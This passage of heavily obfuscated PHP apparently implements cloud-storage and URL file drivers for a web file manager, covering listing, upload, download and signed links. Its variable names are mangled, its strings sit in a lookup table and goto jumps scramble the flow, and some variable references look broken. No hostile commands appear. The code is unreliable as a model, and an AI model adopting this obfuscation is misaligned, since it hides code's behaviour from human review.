array($ÆÙÇ¸ò©[1562] . "\57{$this->bucket}\x2f{$ö°·Áìı}", $ÆÙÇ¸ò©[1561]); $¸†ÈŞ¶¹ = $this->ussRequest($ÁâˆÕÜô, $ÆÙÇ¸ò©[259], !1, $ÊºÖ·•˜); return $¸†ÈŞ¶¹[$ÆÙÇ¸ò©[1294]] ? !0 : $this->getPathOuter($ÁâˆÕÜô); } public function delFile($ïıñĞ“è) { $’Ñ¹ÓÎÄ =& $_SERVER[³Ôà×Ó]; $ªíä±ƒï = $this->ussRequest($ïıñĞ“è, $’Ñ¹ÓÎÄ[1563]); return $ªíä±ƒï[$’Ñ¹ÓÎÄ[1294]] ? !0 : !1; } public function delFolder($¼´—ü©Ï) { $–ãÎóƒâ =& $_SERVER[³Ôà×Ó]; if (!$this->exist($¼´—ü©Ï)) { return !0; } $this->listItemCache = !1; $œŒÔüÙ = $„ÄÔÁè = array(); $this->fileList($¼´—ü©Ï, $œŒÔüÙ, $„ÄÔÁè, !0); $this->listItemCache = !0; foreach ($„ÄÔÁè as $«“ğøçº) { $÷‹ìÍå› = $this->ussRequest($«“ğøçº[$–ãÎóƒâ[32]], $–ãÎóƒâ[1563]); if (!$÷‹ìÍå›[$–ãÎóƒâ[1294]]) { return !1; } } foreach ($œŒÔüÙ as $®Á®Úï•) { $÷‹ìÍå› = $this->ussRequest($®Á®Úï•, $–ãÎóƒâ[1563]); if (!$÷‹ìÍå›[$–ãÎóƒâ[1294]]) { return !1; } } $÷‹ìÍå› = $this->ussRequest($¼´—ü©Ï, $–ãÎóƒâ[1563]); return $÷‹ìÍå›[$–ãÎóƒâ[1294]]; } public function rename($Š„¥Æñ…, $µÏİÖ¯â) { if ($this->isFile($Š„¥Æñ…)) { $µÏİÖ¯â = get_path_father($Š„¥Æñ…) . $µÏİÖ¯â; return $this->moveFile($Š„¥Æñ…, $µÏİÖ¯â); } return $this->renameObject($Š„¥Æñ…, $µÏİÖ¯â); } public function fileInfo($ñùŠÊ¾´, $ôˆÙõé = false, $ŠĞƒ½Úı = array()) { $øùÔêô =& $_SERVER[³Ôà×Ó]; $ùÑìç¡ = array($øùÔêô[32] => $this->pathThis($ñùŠÊ¾´), $øùÔêô[87] => $this->getPathOuter($øùÔêô[8] . $ñùŠÊ¾´), $øùÔêô[33] => $øùÔêô[230], $øùÔêô[79] => isset($ŠĞƒ½Úı[$øùÔêô[79]]) ? $ŠĞƒ½Úı[$øùÔêô[79]] : 0, $øùÔêô[169] => $this->ext($ñùŠÊ¾´)); if ($ôˆÙõé) { return $ùÑìç¡; } $ùÑìç¡[$øùÔêô[231]] = $ùÑìç¡[$øùÔêô[88]] = 0; $ùÑìç¡[$øùÔêô[232]] = $ùÑìç¡[$øùÔêô[233]] = !0; if (empty($ŠĞƒ½Úı)) { $ŠĞƒ½Úı = $this->objectMeta($ñùŠÊ¾´); if (!$ŠĞƒ½Úı) { return $ùÑìç¡; } } $ùÑìç¡[$øùÔêô[231]] = intval($ŠĞƒ½Úı[$øùÔêô[1564]]); $ùÑìç¡[$øùÔêô[88]] = intval($ŠĞƒ½Úı[$øùÔêô[1565]]); $ùÑìç¡[$øùÔêô[79]] = $ŠĞƒ½Úı[$øùÔêô[79]]; return $ùÑìç¡; } public function folderInfo($º¢¯Äœä, $øß•ëÙ = false) { $ÜôşÃ² =& $_SERVER[³Ôà×Ó]; $«¾­­Ëú = array($ÜôşÃ²[32] => $this->pathThis($º¢¯Äœä), $ÜôşÃ²[87] => $this->getPathOuter($ÜôşÃ²[8] . $º¢¯Äœä), $ÜôşÃ²[33] => $ÜôşÃ²[78]); if ($øß•ëÙ) { return $«¾­­Ëú; } $«¾­­Ëú[$ÜôşÃ²[231]] = $«¾­­Ëú[$ÜôşÃ²[88]] = 0; $«¾­­Ëú[$ÜôşÃ²[232]] = $«¾­­Ëú[$ÜôşÃ²[233]] = !0; if (empty($ÆÒıÉ”Í)) { $ÆÒıÉ”Í = $this->objectMeta($º¢¯Äœä); if (!$ÆÒıÉ”Í) { return $«¾­­Ëú; } } $«¾­­Ëú[$ÜôşÃ²[231]] = intval($ÆÒıÉ”Í[$ÜôşÃ²[1564]]); $«¾­­Ëú[$ÜôşÃ²[88]] = intval($ÆÒıÉ”Í[$ÜôşÃ²[1565]]); return $«¾­­Ëú; } private function listObjs($ÁìåÅ€ı, $¶’‘ßù = 0, $¿µÊÃ‚ = 1000) { $©œ¶´  =& $_SERVER[³Ôà×Ó]; $êùğ›’ = array($©œ¶´ [1566], $©œ¶´ [1567] . $¿µÊÃ‚); if ($¶’‘ßù) { $êùğ›’[] = $©œ¶´ [1568] . $¶’‘ßù; } $õÒø¶› = $this->ussRequest($ÁìåÅ€ı, $©œ¶´ [261], !1, $êùğ›’); return !$õÒø¶›[$©œ¶´ [1294]] ? !1 : $õÒø¶›[$©œ¶´ [1284]]; } private function fileList($ïÚ»…ËÑ, &$ù˜³éĞ£, &$«·áØÚä, $”³æ±¨Á = false) { $ÃÛ£Õ¸÷ =& $_SERVER[³Ôà×Ó]; $á²âÒÜİ = $ÃÛ£Õ¸÷[12]; $†Œğ±ò = 1000; $õˆï˜‰É = rtrim($ïÚ»…ËÑ, $ÃÛ£Õ¸÷[8]) . $ÃÛ£Õ¸÷[8]; while (!0) { check_abort(); $‚à§‡£ = $this->listObjs($ïÚ»…ËÑ, $á²âÒÜİ, $†Œğ±ò); if (!$‚à§‡£) { return !1; } $á²âÒÜİ = isset($‚à§‡£[$ÃÛ£Õ¸÷[1569]]) ? $‚à§‡£[$ÃÛ£Õ¸÷[1569]] : $ÃÛ£Õ¸÷[12]; $˜×³¾ÏÂ = isset($‚à§‡£[$ÃÛ£Õ¸÷[1570]]) ? $‚à§‡£[$ÃÛ£Õ¸÷[1570]] : array(); foreach ($˜×³¾ÏÂ as $±£ø´í) { $®·Î¢À¬ = $±£ø´í[$ÃÛ£Õ¸÷[33]] == $ÃÛ£Õ¸÷[78] ? !0 : !1; $÷ç­¤×ø = ltrim($õˆï˜‰É . $±£ø´í[$ÃÛ£Õ¸÷[32]], $ÃÛ£Õ¸÷[8]) . ($®·Î¢À¬ ? $ÃÛ£Õ¸÷[8] : $ÃÛ£Õ¸÷[12]); $›¸˜Ò› = array($ÃÛ£Õ¸÷[32] => $÷ç­¤×ø, $ÃÛ£Õ¸÷[33] => $®·Î¢À¬ ? $ÃÛ£Õ¸÷[78] : $ÃÛ£Õ¸÷[230], $ÃÛ£Õ¸÷[79] => $±£ø´í[$ÃÛ£Õ¸÷[413]], $ÃÛ£Õ¸÷[1565] => $±£ø´í[$ÃÛ£Õ¸÷[1571]]); $this->cacheMethodInfoSet($÷ç­¤×ø, $®·Î¢À¬, $›¸˜Ò›); if ($®·Î¢À¬) { $ù˜³éĞ£[] = $÷ç­¤×ø; if ($”³æ±¨Á) { $this->fileList($÷ç­¤×ø, $ù˜³éĞ£, $«·áØÚä, $”³æ±¨Á); } continue; } $«·áØÚä[] = $›¸˜Ò›; } if (count($˜×³¾ÏÂ) < $†Œğ±ò) { break; } } $this->cacheMethodInfoSet($ïÚ»…ËÑ, !0); } public function listPath($ÅÀ¯ëãÖ, $÷äÕ™©ş = false) { $Å”‰½³ =& $_SERVER[³Ôà×Ó]; $±äŸß÷é = $Ìå® ‡ = array(); $this->fileList($ÅÀ¯ëãÖ, $±äŸß÷é, $Ìå® ‡); foreach ($±äŸß÷é as $Ï¶ÌŞƒ => $’ğİÅÖ) { $±äŸß÷é[$Ï¶ÌŞƒ] = $this->folderInfo($’ğİÅÖ, $÷äÕ™©ş); } foreach ($Ìå® ‡ as $Ï¶ÌŞƒ => $’ğİÅÖ) { $Ìå® ‡[$Ï¶ÌŞƒ] = $this->fileInfo($’ğİÅÖ[$Å”‰½³[32]], $÷äÕ™©ş, $’ğİÅÖ); } return array($Å”‰½³[85] => $±äŸß÷é, $Å”‰½³[86] => $Ìå® ‡); } public function has($š¯şñò€, $ç”Õˆ‰³ = false, $ÈÜ‡ŸºÂ = true) { $¬±€ÚÅğ =& $_SERVER[³Ôà×Ó]; $âşÓûêò = $¬±€ÚÅğ[12]; $Ã‰óƒµş = 500; $¿ò¾Óê  = 0; $«Ø¸„æ£ = 0; $ÌºØÏÊü = rtrim($š¯şñò€, $¬±€ÚÅğ[8]) . $¬±€ÚÅğ[8]; while (!0) { check_abort(); $ä›á´ = $this->listObjs($š¯şñò€, $âşÓûêò, $Ã‰óƒµş); if (!$ä›á´) { return !1; } $âşÓûêò = isset($ä›á´[$¬±€ÚÅğ[1569]]) ? $ä›á´[$¬±€ÚÅğ[1569]] : $¬±€ÚÅğ[12]; $Œ­›ĞÃã = isset($ä›á´[$¬±€ÚÅğ[1570]]) ? $ä›á´[$¬±€ÚÅğ[1570]] : array(); if (empty($Œ­›ĞÃã)) { break; } $Ï¶ïßê´ = array_filter($Œ­›ĞÃã, function ($åËÑ²Óå) { $ùÉöèÀ´ =& $_SERVER[³Ôà×Ó]; return $åËÑ²Óå[$ùÉöèÀ´[33]] == $ùÉöèÀ´[78]; }); $òÔ£”  = count($Œ­›ĞÃã); $Ï¶ïßê´ = count($Ï¶ïßê´); $Şî¯¶˜¬ = $òÔ£”  - $Ï¶ïßê´; if ($ç”Õˆ‰³) { $«Ø¸„æ£ += $Ï¶ïßê´; $¿ò¾Óê  += $Şî¯¶˜¬; if ($òÔ£”  < $Ã‰óƒµş) { break; } continue; } if ($ÈÜ‡ŸºÂ) { if ($Şî¯¶˜¬) { return !0; } } else { if ($Ï¶ïßê´) { return !0; } } if ($òÔ£”  < $Ã‰óƒµş) { break; } } if ($ç”Õˆ‰³) { return array($¬±€ÚÅğ[239] => $¿ò¾Óê , $¬±€ÚÅğ[240] => $«Ø¸„æ£); } return !1; } public function listAll($Ïß·ÄÉ®) { $ÃÃ÷ûÈ„ =& $_SERVER[³Ôà×Ó]; $Ä÷éˆÂª = $¿ÅÇÀÓË = array(); $this->fileList($Ïß·ÄÉ®, $Ä÷éˆÂª, $¿ÅÇÀÓË, !0); $çç€‡™š = array_to_keyvalue($¿ÅÇÀÓË, $ÃÃ÷ûÈ„[32]); foreach ($Ä÷éˆÂª as $’¢Ï›å) { if (is_string($’¢Ï›å)) { $çç€‡™š[$’¢Ï›å] = array($ÃÃ÷ûÈ„[79] => 0); } } return $this->listAllFiles($Ïß·ÄÉ®, $çç€‡™š); } public function canRead($«²ˆÍì¿) { return $this->exist($«²ˆÍì¿) ? !0 : !1; } public function canWrite($Û¥¨ĞÀí) { return $this->exist($Û¥¨ĞÀí) ? !0 : !1; } public function getContent($®§¤É•‡) { return $this->fileSubstr($®§¤É•‡, 0, -1); } public function setContent($²ñù£ø¨, $ç…åò‰ê = '') { $ÆöÏ»ŠÎ =& $_SERVER[³Ôà×Ó]; if (!$ç…åò‰ê) { $µ•À×ü‹ = $this->ussRequest($²ñù£ø¨, $ÆöÏ»ŠÎ[257]); return $µ•À×ü‹[$ÆöÏ»ŠÎ[1294]]; } $å×™Ëóà = $this->tempFile($this->pathThis($²ñù£ø¨)); file_put_contents($å×™Ëóà, $ç…åò‰ê); if ($this->upload($²ñù£ø¨, $å×™Ëóà)) { $this->tempFileRemve($å×™Ëóà); return !0; } return !1; } public function fileSubstr($–»ßÚ±¡, $÷£Ì•Â, $ËÏîÉØ) { $º›ğ¿ì‚ =& $_SERVER[³Ôà×Ó]; if (!($Å€í¡öæ = $this->link($–»ßÚ±¡))) { return !1; } $åãäÚ˜ó = !1; if ($ËÏîÉØ > 0) { $Ë¨êãûĞ = $÷£Ì•Â + $ËÏîÉØ - 1; $åãäÚ˜ó = array($º›ğ¿ì‚[1530] . $÷£Ì•Â . $º›ğ¿ì‚[471] . $Ë¨êãûĞ); } $Œëü£à× = url_request($Å€í¡öæ, $º›ğ¿ì‚[261], !1, $åãäÚ˜ó); return $Œëü£à×[$º›ğ¿ì‚[825]] ? $Œëü£à×[$º›ğ¿ì‚[1284]] : !1; } public function upload($ƒ²€÷‚Ç, $¿×¥‰‡©, $·¶³Üİ´ = false, $ĞÕŞ³¤¹ = REPEAT_REPLACE) { $ºš—²ç§ =& $_SERVER[³Ôà×Ó]; $‘Õ–±Òš = IO::size($¿×¥‰‡©); if ($‘Õ–±Òš <= 1024 * 1024 * 200) { $Ú¸Ç‰ÉÀ = array($ºš—²ç§[1572] . $¿×¥‰‡©); $£öâûÚ = $this->ussRequest($ƒ²€÷‚Ç, $ºš—²ç§[259], $Ú¸Ç‰ÉÀ); return $£öâûÚ[$ºš—²ç§[1294]] ? $this->getPathOuter($ƒ²€÷‚Ç) : !1; } $²àÖîëë = 1024 * 1024 * 10; $™¦­› = array($ºš—²ç§[1573], $ºš—²ç§[1574] . $‘Õ–±Òš, $ºš—²ç§[1575], $ºš—²ç§[1576] . $²àÖîëë); $£öâûÚ = $this->ussRequest($ƒ²€÷‚Ç, $ºš—²ç§[259], !1, $™¦­›); if (!$£öâûÚ[$ºš—²ç§[1294]]) { return !1; } $õ·ÑÕÄÄ = $£öâûÚ[$ºš—²ç§[1284]]; $¶¹¶Í³— = 0; $¡²ÎùèÂ = $õ·ÑÕÄÄ[$ºš—²ç§[1577]]; $±±î»òÈ = fopen($¿×¥‰‡©, $ºš—²ç§[1453]); if (!$±±î»òÈ) { return !1; } do { $Ş°§˜óğ = $õ·ÑÕÄÄ[$ºš—²ç§[1578]]; fseek_64($±±î»òÈ, $¶¹¶Í³—); $È½÷ÛÒı = fread($±±î»òÈ, $Ş°§˜óğ); $Øé¬”´Ü = 0; do { $Øé¬”´Ü++; $õ·ÑÕÄÄ = $this->uploadPart($ƒ²€÷‚Ç, $õ·ÑÕÄÄ, $È½÷ÛÒı); } while (!$õ·ÑÕÄÄ && $Øé¬”´Ü < 3); if (!$õ·ÑÕÄÄ) { return !1; } $¡²ÎùèÂ = $õ·ÑÕÄÄ[$ºš—²ç§[1577]]; $¶¹¶Í³— += $Ş°§˜óğ; } while ($¡²ÎùèÂ != -1); fclose($±±î»òÈ); $™¦­› = array($ºš—²ç§[1579], $ºš—²ç§[1580] . $õ·ÑÕÄÄ[$ºš—²ç§[1581]], $ºš—²ç§[1575]); $£öâûÚ = $this->ussRequest($ƒ²€÷‚Ç, $ºš—²ç§[259], !1, $™¦­›); return $£öâûÚ[$ºš—²ç§[1294]] ? $this->getPathOuter($ğù’ıØò) : !1; } private function uploadPart($Üô©—É, $¡·ÄáÕÁ, &$Æø°Ôì¾) { $ˆ¹†ı˜ =& $_SERVER[³Ôà×Ó]; $×…Åô¯‹ = array($ˆ¹†ı˜[1582], $ˆ¹†ı˜[1580] . $¡·ÄáÕÁ[$ˆ¹†ı˜[1581]], $ˆ¹†ı˜[1583] . $¡·ÄáÕÁ[$ˆ¹†ı˜[1577]], $ˆ¹†ı˜[146] . $¡·ÄáÕÁ[$ˆ¹†ı˜[1578]]); $ƒ¼ó·•€ = $this->ussRequest($Üô©—É, $ˆ¹†ı˜[259], $Æø°Ôì¾, $×…Åô¯‹); return !$ƒ¼ó·•€[$ˆ¹†ı˜[1294]] ? $ƒ¼ó·•€[$ˆ¹†ı˜[1294]] : $ƒ¼ó·•€[$ˆ¹†ı˜[1284]]; } public function uploadFormData($í³¤¦òÜ, $ùÜÅ’ƒ = 3600) { return $this->uploadPolicy($í³¤¦òÜ, $ùÜÅ’ƒ); } public function multiUploadFormData($ÃˆÇˆÛß, $»ùµµò = 3600) { $ÑÁé’÷§ =& $_SERVER[³Ôà×Ó]; $•§î—ø = (int) $GLOBALS[$ÑÁé’÷§[7]][$ÑÁé’÷§[79]]; return $this->uploadPolicy($ÃˆÇˆÛß, $»ùµµò, $•§î—ø); } private function uploadPolicy($ñ—ÒÔò½, $«ı£¿©‡ = 3600, $šé¼ı¤ª = 0) { $î²¨—ÕÆ =& $_SERVER[³Ôà×Ó]; $¾İ”¨ÛŸ = $î²¨—ÕÆ[8] . $this->bucket; $“÷Ó‘ß = gmdate($î²¨—ÕÆ[1488]); $ÆØªÍÈ¡ = array($î²¨—ÕÆ[1584] => $this->bucket, $î²¨—ÕÆ[1585] => $ñ—ÒÔò½, $î²¨—ÕÆ[1586] => time() + $«ı£¿©‡, $î²¨—ÕÆ[1587] => $“÷Ó‘ß); if ($šé¼ı¤ª) { $ÆØªÍÈ¡[$î²¨—ÕÆ[1473]] = $šé¼ı¤ª; } $øø Ü = base64_encode(json_encode($ÆØªÍÈ¡)); $Ï‚­¦Í† = base64_encode(hash_hmac($î²¨—ÕÆ[1541], "\120\117\x53\x54\x26{$¾İ”¨ÛŸ}\x26{$“÷Ó‘ß}\46{$øø Ü}", md5("{$this->userpass}"), !0)); $ÔÜÖûƒà = array($î²¨—ÕÆ[293] => $øø Ü, $î²¨—ÕÆ[1588] => "\x55\120\x59\x55\x4e\40{$this->username}\72{$Ï‚­¦Í†}", $î²¨—ÕÆ[208] => $this->endpoint . $¾İ”¨ÛŸ); return $ÔÜÖûƒà; } public function download($ï’íéÅ, $â¡«ÍÒÖ) { $‘Å¢•Í» = IO::getPathInner(IO::mkfile($â¡«ÍÒÖ)); if (!($Û·‹×•± = $this->link($ï’íéÅ))) { return !1; } $Æ´Ï»Å = 0; $ë“ Á´Ê = 1024 * 200; $©ÜÂ‹­¬ = fopen($‘Å¢•Í», $_SERVER[³Ôà×Ó][1536]); while (!0) { $¢”Ô”Ã = $this->fileSubstr($ï’íéÅ, $Æ´Ï»Å, $ë“ Á´Ê); if ($¢”Ô”Ã === !1) { return !1; } fwrite($©ÜÂ‹­¬, $¢”Ô”Ã); $Æ´Ï»Å += $ë“ Á´Ê; if (strlen($¢”Ô”Ã) < $ë“ Á´Ê) { break; } } fclose($©ÜÂ‹­¬); return $â¡«ÍÒÖ; } public function link($¼®¦Ô‹«, $»ˆœ™Š• = array()) { $Êã¾²ûã =& $_SERVER[³Ôà×Ó]; $¼®¦Ô‹« = trim($¼®¦Ô‹«, $Êã¾²ûã[8]); if (!empty($this->token)) { $šÙâÉÈ÷ = strtotime(date($Êã¾²ûã[1589])); $äşÔÑçØ = substr(md5($this->token . $Êã¾²ûã[360] . $šÙâÉÈ÷ . $Êã¾²ûã[1590] . $¼®¦Ô‹«), 12, 8) . $šÙâÉÈ÷; $»ˆœ™Š•[] = $Êã¾²ûã[1591] . $äşÔÑçØ; } $³Íó‘š€ = !empty($»ˆœ™Š•) ? $Êã¾²ûã[76] . implode($Êã¾²ûã[360], $»ˆœ™Š•) : $Êã¾²ûã[12]; return $this->getHost() . $Êã¾²ûã[8] . $¼®¦Ô‹« . $³Íó‘š€; } public function fileOut($²¶Ä—ñ”, $»¤Æ “‚ = false, $‚â—İŠ± = false, $×¬Ş­ƒ´ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($²¶Ä—ñ”, $»¤Æ “‚, $‚â—İŠ±, $×¬Ş­ƒ´); } if (!$‚â—İŠ±) { $‚â—İŠ± = $this->pathThis($²¶Ä—ñ”); } $¦»­’Î¹ = $»¤Æ “‚ ? array($_SERVER[³Ôà×Ó][1592] . rawurlencode($‚â—İŠ±)) : array(); $ÍüŸ’„Ñ = $this->link($²¶Ä—ñ”, $¦»­’Î¹); $this->fileOutLink($ÍüŸ’„Ñ); } public function fileOutServer($¬ı½…ÅÂ, $§Šñçú™ = false, $Âª¬ §¸ = false, $ôÕ–ÏßÑ = '') { parent::fileOut($¬ı½…ÅÂ, $§Šñçú™, $Âª¬ §¸, $ôÕ–ÏßÑ); } public function fileOutImage($¬ÙÎÈßĞ, $éï€ÂİÀ = 250) { $Æ˜…¿œ÷ = $this->link($¬ÙÎÈßĞ . $_SERVER[³Ôà×Ó][1593] . $éï€ÂİÀ); $this->fileOutLink($Æ˜…¿œ÷); } public function fileOutImageServer($¹§£ë˜„, $£Õ˜ÈÒÛ = 250) { parent::fileOutImage($¹§£ë˜„, $£Õ˜ÈÒÛ); } public function hashMd5($Ò ÌéÙ) { $åõõğÌÂ =& $_SERVER[³Ôà×Ó]; $Ì¯œ—¢İ = $this->_objectMeta($Ò ÌéÙ); return isset($Ì¯œ—¢İ[$åõõğÌÂ[245]]) ? $Ì¯œ—¢İ[$åõõğÌÂ[245]] : !1; } public function size($¬ÏÚ´Ò) { $Õé¬ÌÒ¹ = $this->objectMeta($¬ÏÚ´Ò); return $Õé¬ÌÒ¹ ? $Õé¬ÌÒ¹[$_SERVER[³Ôà×Ó][79]] : 0; } public function info($»‚‰ùøš) { if ($this->isFolder($»‚‰ùøš)) { return $this->folderInfo($»‚‰ùøš); } else { if ($this->isFile($»‚‰ùøš)) { return $this->fileInfo($»‚‰ùøš); } } return !1; } public function exist($˜ãŒÉÃ) { return $this->isFile($˜ãŒÉÃ) || $this->isFolder($˜ãŒÉÃ); } public function isFile($úóòÕ”á) { return !$this->isFolder($úóòÕ”á) && $this->objectMeta($úóòÕ”á); } public function isFolder($é†ªóöµ) { return $this->cacheMethod($_SERVER[³Ôà×Ó][179], $é†ªóöµ); } protected function objectMeta($Ïõ•ùüÚ) { return $this->cacheMethod($_SERVER[³Ôà×Ó][181], $Ïõ•ùüÚ); } protected function _objectMeta($÷ûóšÛÏ) { $İıî„ˆí =& $_SERVER[³Ôà×Ó]; if ($÷ûóšÛÏ == $İıî„ˆí[12] || $÷ûóšÛÏ == $İıî„ˆí[8]) { return array(); } $ğñ­àš† = $this->ussRequest($÷ûóšÛÏ, $İıî„ˆí[1594]); if (!$ğñ­àš†[$İıî„ˆí[1294]]) { return null; } $†Ü°Š° = isset($ğñ­àš†[$İıî„ˆí[1284]]) ? $ğñ­àš†[$İıî„ˆí[1284]] : array(); if (!isset($†Ü°Š°[$İıî„ˆí[1595]])) { return null; } $èò®ÌÚÄ = array($İıî„ˆí[33] => isset($†Ü°Š°[$İıî„ˆí[1595]]) ? $†Ü°Š°[$İıî„ˆí[1595]] : null, $İıî„ˆí[79] => isset($†Ü°Š°[$İıî„ˆí[1596]]) ? $†Ü°Š°[$İıî„ˆí[1596]] : null, $İıî„ˆí[245] => isset($†Ü°Š°[$İıî„ˆí[1597]]) ? $†Ü°Š°[$İıî„ˆí[1597]] : null, $İıî„ˆí[1564] => isset($†Ü°Š°[$İıî„ˆí[1598]]) ? $†Ü°Š°[$İıî„ˆí[1598]] : null); $èò®ÌÚÄ[$İıî„ˆí[1565]] = isset($†Ü°Š°[$İıî„ˆí[1599]]) ? strtotime($†Ü°Š°[$İıî„ˆí[1599]]) : $èò®ÌÚÄ[$İıî„ˆí[1564]]; return $èò®ÌÚÄ; } protected function _isFolder($æİ©‰±¾) { $¸Øı¡Š” =& $_SERVER[³Ôà×Ó]; if ($æİ©‰±¾ == $¸Øı¡Š”[12] || $æİ©‰±¾ == $¸Øı¡Š”[8]) { return !0; } $ºÈº³úÄ = $this->_objectMeta($æİ©‰±¾); return isset($ºÈº³úÄ[$¸Øı¡Š”[33]]) && $ºÈº³úÄ[$¸Øı¡Š”[33]] == $¸Øı¡Š”[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ç…“ËÄ = false) { } public function exist($³—Õ) { $ğıŠ¢ = $this->info($³—Õ); return $ğıŠ¢[$_SERVER[³Ôà×Ó][232]]; } public function isFile($¢ì‚ˆ”) { $­è¢Áğ = $this->info($¢ì‚ˆ”); return $­è¢Áğ[$_SERVER[³Ôà×Ó][232]]; } public function isFolder($÷€®„Ÿñ) { return !1; } public function size($°«‰œøä) { $Üİ¨»¢ë = $this->info($°«‰œøä); return $Üİ¨»¢ë[$_SERVER[³Ôà×Ó][79]]; } public function info($µ‘ ê€²) { return $this->infoParse($µ‘ ê€²); } public function infoAuth($¹ÚÄÖ‘) { return $this->infoParse($¹ÚÄÖ‘); } public function infoWithChildren($Ğó”Ã¶ö) { return $this->infoParse($Ğó”Ã¶ö); } public function infoFull($äë’†ÈÔ) { return $this->infoParse($äë’†ÈÔ); } private function infoParse($ºš´Å†½) { $ÙÖÙÀ‰ =& $_SERVER[³Ôà×Ó]; $ùËø½×€ = $this->header($ºš´Å†½); if (!$ùËø½×€ || !$ùËø½×€[$ÙÖÙÀ‰[825]]) { return !1; } $ÇñÏéöÁ = _get($ùËø½×€, $ÙÖÙÀ‰[413], 0); $³ÅÑëÑÊ = array($ÙÖÙÀ‰[32] => $ùËø½×€[$ÙÖÙÀ‰[32]], $ÙÖÙÀ‰[87] => $ºš´Å†½, $ÙÖÙÀ‰[33] => $ÙÖÙÀ‰[230], $ÙÖÙÀ‰[79] => intval($ÇñÏéöÁ), $ÙÖÙÀ‰[169] => get_path_ext($ùËø½×€[$ÙÖÙÀ‰[32]]), $ÙÖÙÀ‰[1450] => $ÇñÏéöÁ > 0 && $ùËø½×€[$ÙÖÙÀ‰[1600]], $ÙÖÙÀ‰[1451] => !1); return $³ÅÑëÑÊ; } private function header($æ¦Ë›¬×) { $¾¥ûÉÈŞ =& $_SERVER[³Ôà×Ó]; if (isset(self::$_cacheHeader[$æ¦Ë›¬×])) { return self::$_cacheHeader[$æ¦Ë›¬×]; } $Ê™³ë = isset($GLOBALS[$¾¥ûÉÈŞ[1601]]) ? $GLOBALS[$¾¥ûÉÈŞ[1601]] : !1; $GLOBALS[$¾¥ûÉÈŞ[1601]] = !0; self::$_cacheHeader[$æ¦Ë›¬×] = url_header($æ¦Ë›¬×); $GLOBALS[$¾¥ûÉÈŞ[1601]] = $Ê™³ë; return self::$_cacheHeader[$æ¦Ë›¬×]; } public function hashSimple($Òšóñœ…, $ Ä‰®å = false) { $â¸ËóÃ© =& $_SERVER[³Ôà×Ó]; $¾ÔÊÊ† = $this->info($Òšóñœ…); if (!$¾ÔÊÊ† || !$¾ÔÊÊ†[$â¸ËóÃ©[232]]) { return !1; } $üÉƒ‹­“ = $¾ÔÊÊ†[$â¸ËóÃ©[79]]; $âÂ¸¼œ¾ = 200; $°°ë˜ÖÊ = 50; if ($üÉƒ‹­“ <= $âÂ¸¼œ¾ * $°°ë˜ÖÊ) { return md5($this->fileSubstr($Òšóñœ…, 0, $üÉƒ‹­“)) . $üÉƒ‹­“; } $–ãêœÎı = intval($üÉƒ‹­“ / $°°ë˜ÖÊ); $À§İˆ ç = $â¸ËóÃ©[12]; $Ò¤ğßüœ = timeFloat(); $Ñ–ûä×Â = 15; for ($Ò‹œ×±å = 0; $Ò‹œ×±å < $°°ë˜ÖÊ; $Ò‹œ×±å++) { if (timeFloat() - $Ò¤ğßüœ > $Ñ–ûä×Â) { return !1; } $¨Â‚¯¤î = $this->fileSubstr($Òšóñœ…, $–ãêœÎı * $Ò‹œ×±å, $âÂ¸¼œ¾); if (!$¨Â‚¯¤î) { return !1; } $À§İˆ ç .= $¨Â‚¯¤î; } $À§İˆ ç .= $this->fileSubstr($Òšóñœ…, $üÉƒ‹­“ - $âÂ¸¼œ¾, $âÂ¸¼œ¾); return md5($À§İˆ ç) . $üÉƒ‹­“; } public function getContent($Û…”¤é) { return $this->fileSubstr($Û…”¤é); } public function fileSubstr($×õ¹³óå, $è¯ïù’ø = 0, $ş©ç—–• = -1) { $‘ÜÕ­¡ =& $_SERVER[³Ôà×Ó]; $Ü¿Ò¶ûÅ = $this->info($×õ¹³óå); if (!$Ü¿Ò¶ûÅ || !$Ü¿Ò¶ûÅ[$‘ÜÕ­¡[232]] && $Ü¿Ò¶ûÅ[$‘ÜÕ­¡[79]] > 1024 * 1024 * 10) { return !1; } if ($ş©ç—–• === -1) { $ş©ç—–• = $Ü¿Ò¶ûÅ[$‘ÜÕ­¡[79]]; } if ($ş©ç—–• == 0) { return $‘ÜÕ­¡[12]; } $–¹éç“Ò = array($‘ÜÕ­¡[1602] . $è¯ïù’ø . $‘ÜÕ­¡[860] . ($è¯ïù’ø + $ş©ç—–• - 1)); $ì¥‚´Úî = url_request($×õ¹³óå, $‘ÜÕ­¡[261], !1, $–¹éç“Ò, !1, !1, 30); return $ì¥‚´Úî[$‘ÜÕ­¡[1284]] ? $ì¥‚´Úî[$‘ÜÕ­¡[1284]] : $‘ÜÕ­¡[12]; } public function download($óœÀ®Ñç, $îçËó¢) { Downloader::start($óœÀ®Ñç, $îçËó¢); return $îçËó¢; } } goto E™îÎ¯ÏĞÇ; B¯¿™šÕŸ: class AnalysisModel extends ModelBaseLight { public function init($»µà±¢€) { $„«¨‚¶Ê =& $_SERVER[³Ôà×Ó]; $éš’Üƒ¨ = array($„«¨‚¶Ê[671] => array($„«¨‚¶Ê[33] => $„«¨‚¶Ê[1892], $„«¨‚¶Ê[350] => array($„«¨‚¶Ê[255], $„«¨‚¶Ê[840], $„«¨‚¶Ê[1893], $„«¨‚¶Ê[1894])), $„«¨‚¶Ê[1895] => array($„«¨‚¶Ê[33] => $„«¨‚¶Ê[1896], $„«¨‚¶Ê[350] => array($„«¨‚¶Ê[255], $„«¨‚¶Ê[838], $„«¨‚¶Ê[1897], $„«¨‚¶Ê[1898], $„«¨‚¶Ê[1899]))); if (!isset($éš’Üƒ¨[$»µà±¢€])) { return !1; } $this->optionType = $éš’Üƒ¨[$»µà±¢€][$„«¨‚¶Ê[33]]; $this->field = $éš’Üƒ¨[$»µà±¢€][$„«¨‚¶Ê[350]]; return !0; } public function listData($®Ü÷Ö¯¹ = false, $¬×Í¸´ = "\x6d\x6f\x64\x69\146\x79\124\x69\155\x65", $®„ìù = false) { return parent::listData($®Ü÷Ö¯¹, $¬×Í¸´, $®„ìù); } public function trendList($ÕíÖÉñÁ) { $ñ¼ñëà =& $_SERVER[³Ôà×Ó]; $†ñÚû‹¯ = $this->listData(); if ($†ñÚû‹¯) { $¾Öê±‡È = end($†ñÚû‹¯); $ûùı­° = date($ñ¼ñëà[1900], strtotime($ñ¼ñëà[1901])); if ($¾Öê±‡È[$ñ¼ñëà[255]] == $ûùı­°) { return $†ñÚû‹¯; } $ßà¡¤„µ = 